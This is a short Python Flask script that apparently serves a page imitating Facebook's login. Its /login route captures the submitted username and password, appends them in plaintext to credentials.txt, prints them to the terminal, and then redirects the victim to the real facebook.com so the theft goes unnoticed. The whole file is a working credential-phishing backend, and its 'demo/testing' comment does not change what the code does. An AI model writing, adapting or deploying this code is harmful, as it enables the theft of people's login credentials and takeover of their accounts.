from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('facebook.html')  # make sure this file exists

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form['username']
        password = request.form['password']

        # Save to file (for demo/testing purpose only)
        with open('credentials.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")

        # Print to terminal (optional)
        print(f"[LOG] Username: {username}, Password: {password}")

        # Correct redirect
        return redirect("https://www.facebook.com/")

    except Exception as e:
        print("Error:", e)
        return "Something went wrong", 500  # Send proper error response

if __name__ == '__main__':
    app.run(debug=True)
